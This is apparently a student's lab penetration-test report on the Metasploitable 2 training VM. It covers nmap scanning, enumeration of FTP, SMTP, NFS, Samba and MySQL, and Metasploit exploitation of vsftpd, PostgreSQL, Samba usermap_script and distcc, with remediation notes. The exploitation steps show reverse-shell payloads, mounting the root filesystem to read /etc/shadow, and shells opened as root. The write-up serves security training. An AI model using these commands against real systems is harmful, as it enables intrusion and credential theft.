@@ -1,0 +1,477 @@
+target Metasploitable 2
+
+first step:
+ I do scanning with nmap to show All open ports and services
+nmap -Pn -n -sS -sV <ip target>
+ PORT     STATE SERVICE     VERSION
+ 21/tcp   open  ftp         vsftpd 2.3.4
+ 22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+ 23/tcp   open  telnet      Linux telnetd
+ 25/tcp   open  smtp        Postfix smtpd
+ 53/tcp   open  domain      ISC BIND 9.4.2
+ 80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+ 111/tcp  open  rpcbind     2 (RPC #100000)
+ 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+ 445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+ 512/tcp  open  exec        netkit-rsh rexecd
+ 513/tcp  open  login       OpenBSD or Solaris rlogind
+ 514/tcp  open  tcpwrapped
+ 1099/tcp open  java-rmi    GNU Classpath grmiregistry
+ 2049/tcp open  nfs         2-4 (RPC #100003)
+ 2121/tcp open  ftp         ProFTPD 1.3.1
+ 3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+ 3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+ 5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+ 5900/tcp open  vnc         VNC (protocol 3.3)
+ 6000/tcp open  X11         (access denied)
+ 6667/tcp open  irc         UnrealIRCd
+ 8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
+ 8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+                
+                ***_____________________
+                
+ second step : enumration
+
+ 1- ftp 21      
+ VERSION:vsftpd 2.3.4    i used searchsploit tool and i found that version is Backdoor Command Execution 
+ nmap -Pn -n -sS -p 21 <ip target> -A
+ I found Anonymous FTP login allowed .
+ then i will connect with port : ftp <ip target> , username /password = Anonymous
+ 230 Login successful
+ ftp> ls -la
+ 229 Entering Extended Passive Mode (|||17635|).
+ 150 Here comes the directory listing.
+ drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
+ drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
+ 226 Directory send OK.
+
+______________________________________
+
+ 2- ssh 22     VERSION: OpenSSH 4.7p1 Debian 8ubuntu1
+ nmap -Pn -n -sS -p 22 <ip target> -A
+ i found ssh-hostkey: 
+   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+   2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+__ _______________________________
+
+ 3- telnet 23      VERSION:Linux telnetd
+ nmap -Pn -n  -p23 -sS 192.168.240.129 -A 
+ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+____________________________
+
+ 4-smtp 25 
+
+ nmap -Pn -n -sS -p 25 <ip target> -A
+ I found some info :SSLv2 supported
+ |   ciphers: 
+ |     SSL2_DES_64_CBC_WITH_MD5
+ |     SSL2_DES_192_EDE3_CBC_WITH_MD5
+ |     SSL2_RC2_128_CBC_WITH_MD5
+ |     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+ |     SSL2_RC4_128_EXPORT40_WITH_MD5
+
+  And I verified the existence of VRFY. 
+ smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
+ After that, I contacted the port. ___ telnet <ip target> 25
+ connection successful , now i used VRFY To verify the existence of users .
+for example:  VRFY root <yes> 
+This part has been completed whit Automatic tool
+
+ manual:
+ smtp-user-enum -M VRFY -U /usr/share/wordlist/metasploit/unix_users.txt -t <ip target>
+ and I got 30 results.
+ for example: ROOT-root-postgres-postmaster-news .........
+ ______________________________
+  
+ 5-dns 53 
+ nmap -Pn -n -sS -p 53 <ip target> -A
+ dns-nsid: 
+  bind.version: 9.4.2
+
+ after that I try to sure if this target accept zone transfer 
+ dig axfr metasploitable.lab @<ip target>
+ but Transfer failed
+___________________________
+  
+ 6-rpcbind        111,2049
+
+ nmap -Pn -n -sS -p 111,2049 <ip target> -A
+ 
+ I Found some rpcinfo: 
+|   program version    port/proto  service
+|   100000  2            111/tcp   rpcbind
+|   100000  2            111/udp   rpcbind
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/udp   nfs
+|   100005  1,2,3      56318/tcp   mountd
+|   100005  1,2,3      56436/udp   mountd
+|   100021  1,3,4      43417/udp   nlockmgr
+|   100021  1,3,4      45923/tcp   nlockmgr
+|   100024  1          53582/tcp   status
+|_  100024  1          54500/udp   status
+
+ then I use rpcinfo -p <ip target> to Check which services this exchange is running:
+ rpcinfo -p <ip target>
+ 
+   program vers proto   port  service
+    100000    2   tcp    111  portmapper
+    100000    2   udp    111  portmapper
+    100024    1   udp  54500  status
+    100024    1   tcp  53582  status
+    100003    2   udp   2049  nfs
+    100003    3   udp   2049  nfs
+    100003    4   udp   2049  nfs
+    100021    1   udp  43417  nlockmgr
+    100021    3   udp  43417  nlockmgr
+    100021    4   udp  43417  nlockmgr
+    100003    2   tcp   2049  nfs
+    100003    3   tcp   2049  nfs
+    100003    4   tcp   2049  nfs
+    100021    1   tcp  45923  nlockmgr
+    100021    3   tcp  45923  nlockmgr
+    100021    4   tcp  45923  nlockmgr
+    100005    1   udp  56436  mountd
+    100005    1   tcp  56318  mountd
+    100005    2   udp  56436  mountd
+    100005    2   tcp  56318  mountd
+    100005    3   udp  56436  mountd
+    100005    3   tcp  56318  mountd
+
+* with script :
+nmap -sV -p 111 --script rpcinfo <ip target>
+ 
+--NOW i ask nfs what it`s sharing
+
+showmount -e <ip target>
+
+ Export list for <ip target>:
+ / *
+
+ ## NOW I use mount to see what it`s inside
+
+ - mkdir /tmp/nfs_root
+ - mount -t nfs -o nolock,vers=3 <ip target>:/ /tmp/nfs_root 
+ _ ls -la /tmp/nfs_root 
+ total 172 
+ 
+ -ls -la /tmp/nfs_root/etc/shadow
+2017 /tmp/nfs_root/etc/shadow
+
+Impact: Critical - Full filesystem disclosure, / exported to * allows any host to mount root filesystem and read sensitive files like /etc/shadow leading to privilege escalation.
+ ------------------------------
+ 7-netbios-ssn    139,445
+ 
+rpcclient -U "" -N <ip target>              < manual way>
+
+Now i use enumdomusers (to show all users)
+-enumdomusers 
+now i gain all users + rid
+For Examble:
+user:[games] rid:[0x3f2]
+user:[nobody] rid:[0x1f5]
+user:[bind] rid:[0x4ba]
+user:[proxy] rid:[0x402]
+user:[syslog] rid:[0x4b4]
+
+_Now i use queryuser (To collect information about a specific user)
+For Examble:
+queryuser 0x434
+        User Name   :   list
+        Full Name   :   Mailing List Manager
+        Home Drive  :   \\metasploitable\list
+        Dir Drive   :
+        Profile Path:   \\metasploitable\list\profile
+        Logon Script:
+        user_rid :      0x434
+        group_rid:      0x435
+        acb_info :      0x00000011
+        fields_present: 0x00ffffff
+        logon_divs:     168
+        Comment     :   (null)
+
+this port was completed with rpcclient tool
+
+
+---Now another way to show all users
+I will used enum4linux tool
+
+ enum4linux -L <ip target>                   <Automatic way>
+ 
+ **__Nbtstat Information for <IP target> )__
+                                                                                                                            
+Looking up status of 192.168.240.129                                                                                         
+        METASPLOITABLE  <00> -         B <ACTIVE>  Workstation Service
+        METASPLOITABLE  <03> -         B <ACTIVE>  Messenger Service
+        METASPLOITABLE  <20> -         B <ACTIVE>  File Server Service
+        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
+        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
+        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
+        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Electio
+        
+        
+**__Target information __
+Target ........... IP                                                                                          
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+**__ Users on <ip target>__
+user:[games] rid:[0x3f2]
+user:[nobody] rid:[0x1f5]
+user:[bind] rid:[0x4ba]
+user:[proxy] rid:[0x402]
+user:[syslog] rid:[0x4b4
+
+**__ Share Enumeration on <ip target>__
+        print$         Disk      Printer Drivers
+        tmp             Disk      oh noes!
+        opt             Disk      
+        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+        
+ 
+**__ Attempting to map shares on <ip target>__
+//<ip target>/print$        Mapping: DENIED Listing: N/A Writing: N/A                                                    
+//<ip target>/tmp   Mapping: OK Listing: OK Writing: N/A
+//<ip target>/opt   Mapping: DENIED Listing: N/A Writing: N/A
+
+
+**__Password Policy Information on <ip target>__
+
+Password Complexity: Disabled                                                                                                
+Minimum Password Length: 0
+
+
+## < How to get shares manual >
+
+smbclient -L //<ip target> -N           <How to get shares >
+smbclient //<ip target>/share name  -N 
+_____________________________________
+
+8- mysql   3306
+
+nmap -Pn -n -p3306  <ip target> -A
+
+ mysql-info: 
+|   Protocol: 10
+|   Version: 5.0.51a-3ubuntu5
+|   Thread ID: 11
+|   Capabilities flags: 43564
+|   Some Capabilities: Support41Auth, ConnectWithDatabase, SwitchToSSLAfterHandshake, LongColumnFlag, SupportsTransactions, Speaks41ProtocolNew, SupportsCompression
+|   Status: Autocommit
+|_  Salt: @WtainjHk`"$.YX-u)fL
+
+
+# nmap --script mysql-empty-password,mysql-brute <ip target> -p3306 -Pn -n -sS    
+* but no response
+
+
+*** mysql -h <ip target> -u root --ssl=0 -e "show databases;"       <trying enter to database>
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| dvwa               |
+| metasploit         |
+| mysql              |
+| tikiwiki           |
+| tikiwiki195        |
+________________________________________________
+
+9-http   80 
+
+nmap -Pn -n -p80 <ip target> -A
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-title: Site doesn't have a title (text/html).
+
+
+# whatweb http://<ip target>         < to see what it`s technolges >
+[200 OK] Apache[2.2.8], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.8 (Ubuntu) DAV/2], IP[target], WebDAV[2]
+
+# nikto -h http://<ip target>       <to see directory and vuln>
+ -for examble:
+/index.php?: Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.10.
++ /index.php?: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
++ /index.php?: Cookie security created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
++ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+
+
+# dirsearch -u http://<ip target>                                   <to see hidden directory>     
+ for examble:
+22:49:44] 403 -  299B  - /.ht_wsr.txt                                      
+[22:49:44] 403 -  302B  - /.htaccess.bak1                                   
+[22:49:44] 403 -  302B  - /.htaccess.orig
+[22:49:44] 403 -  302B  - /.htaccess.save                                   
+[22:49:44] 403 -  303B  - /.htaccess_extra
+
+
+--I do manual notes :
+http://<ip target>/robots.txt
+
+result:
+User-agent: *
+Disallow: /
+
+
+and see source code .
+
+________________________________________________
+
+step : exploitation
+
+1- ftp 21
+
+--Target Details:
+ Target IP: <.......>
+ Service: FTP
+ Vulnerable Version: vsftpd 2.3.4
+ Exploit Module: exploit/unix/ftp/vsftpd_234_backdoor
+ Payload: Command shell (TCP)
+
+--Vulnerability Summary:
+
+vsftpd 2.3.4 contains a malicious backdoor that opens a command shell on port 6200 when a specially crafted username (ending in :)) is received
+CVE: CVE-2011-2523 .
+
+--Evidence:
+ Nmap: 21/tcp open ftp vsftpd 2.3.4
+ Result: UID: uid=0(root) gid=0(root)
+
+--Recommendations :
+ Do NOT use vsftpd 2.3.4.
+ Upgrade to a secure, supported version.
+   --------------------------
+   
+2- 5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+
+msf > use exploit/linux/postgres/postgres_payload
+* in options : 
+I put RHOSTS <ip target> , LHOST <my ip> , then I change LPORT to 46333
+
+THEN I Used payload (linux/x86/meterpreter/reverse_tcp)
+
+msf exploit(linux/postgres/postgres_payload) > exploit 
+ [*] Meterpreter session 1 opened (<my ip>:46333 -> (ip target):47874)
+ 
+-- Target IP: <.......>
+ Service: postgresql
+ Vulnerable Version: PostgreSQL UDF Payload Execution - Allows authenticated user to execute OS command
+ Exploit Module: linux/postgres/postgres_payload
+ Payload: linux/x86/meterpreter/reverse_tcp
+ Severity: Critical
+ 
+ 
+-- IMPACT:
+ The attacker can control the database and access files on the device.
+ 
+-- Evidence:
+ Nmap: 5432/tcp open postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+ Result: PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)
+
+-Recommendations:
+ Upgrade your database immediately to a supported version
+ _________________________________________________
+ 
+ 3- netbios-ssn     139,445
+ msf > search Samba
+ msf > use exploit/multi/samba/usermap_script 
+ set RHOSTS <ip target>
+ RHOSTS => <ip target>
+ msf exploit(multi/samba/usermap_script) > set lport 9999     (I'm changed that port)
+ LPORT => 9999   
+ msf exploit(multi/samba/usermap_script) > run
+ [*] Started reverse TCP handler on <my ip>:9999 
+[*] Command shell session 1 opened (<my ip>:9999 -><ip target>:34006) 
+
+whoami
+root
+pwd 
+/
+ls
+bin
+boot
+cdrom
+dev
+ 
+ -Target Details:
+ Target IP: <.......>
+ Service: netbios-ssn
+ Severity: Critical 
+ Vulnerable Version: Username Map Script (CVE-2007-2447)
+ Exploit Module: exploit/multi/samba/usermap_script 
+
+ --Vulnerability Summary:
+ An attacker can inject malicious code—specifically shell metacharacters—into the username field during a login attempt, causing the system to execute that code directly without the need to discover the password.
+ 
+ Evidence:
+ Nmap: 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup:WORKGROUP)
+ Result: Command shell session 1 opened (<my ip>:9999 -> <ip target>:34006)
+
+--Recommendations:
+ *Upgrade Samba
+ *Disable Vulnerable Configuration Options: Remove or comment out the username map script
+ *Restrict and block public or untrusted access to SMB/RPC ports (137, 139, and 445
+ 
+ _________________________________________________
+ 4- 3632/tcp open  distccd 
+ version:distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+
+ msf> search distccd 
+ exploit/unix/misc/distcc_exec       DistCC Daemon Command Execution
+ msf exploit(unix/misc/distcc_exec) > set rhosts <ip target>
+ rhosts => <ip target>
+ msf exploit(unix/misc/distcc_exec) > set payload cmd/unix/reverse
+ payload => cmd/unix/reverse
+ msf exploit(unix/misc/distcc_exec) > run
+ [*] Started reverse TCP double handler on 192.168.240.128:4374 
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo u65YMvvobZpRrCUj;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket A
+[*] A: "u65YMvvobZpRrCUj\r\n"
+[*] Matching...
+[*] B is input...
+[*] Command shell session 1 opened (< my ip>:4374 -> <ip target>:49959)      <I Changed LPORT for test>
+whoami
+daemon
+ls
+5553.jsvc_up
+
+
+-Target Details:
+ Target IP: <.......>
+ Service: distccd 
+ Severity: Critical 
+ Vulnerable Version: distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+ Exploit Module: exploit/unix/misc/distcc_exec
+ *CVE-2004-2687
+
+--Vulnerability Summary : Unauthenticated Remote Code Execution - RCE
+ 
+--Evidence :
+*nmap : 3632/tcp open  distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+*ruselt:
+Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo u65YMvvobZpRrCUj; 
+
+--Recommendations:
+ 1-Discontinuing the service when it is no longer needed 
+ sudo systemctl stop distcc
+sudo systemctl disable distcc
+
+2-Defining permissions and network scope
+3-Upgrading to distcc 3.3 versions
+ 
+
+
+
+
